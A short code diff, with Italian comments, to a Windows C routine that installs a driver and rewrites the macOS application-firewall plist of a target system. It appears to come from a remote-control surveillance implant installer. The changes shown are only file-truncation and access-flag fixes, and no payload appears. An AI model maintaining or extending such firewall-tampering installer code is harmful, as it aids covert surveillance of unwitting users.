@@ -90,6 +90,7 @@ BOOL SafeCopyFile(WCHAR *source_path, WCHAR *dest_path, BOOL destMustExist)
 		}
 	}
 
+	SetEndOfFile(hd);
 	CloseHandle(hs);
 	CloseHandle(hd);
 	SAFE_FREE(buffer);
@@ -267,7 +268,7 @@ BOOL MAC_DriverInstall(os_struct_t *os_info, rcs_struct_t *rcs_info, users_struc
 		CloseHandle(hfile);
 
 	// Scrive il nuovo file alf plist
-	hfile = CreateFile(plist_path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
+	hfile = CreateFile(plist_path, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
 	if (hfile == INVALID_HANDLE_VALUE) {
 		SAFE_FREE(plist_alf_content);
 		return FALSE;
@@ -277,6 +278,7 @@ BOOL MAC_DriverInstall(os_struct_t *os_info, rcs_struct_t *rcs_info, users_struc
 		SAFE_FREE(plist_alf_content);
 		return FALSE;
 	}
+	SetEndOfFile(hfile);
 	CloseHandle(hfile);
 	SAFE_FREE(plist_alf_content);
 	
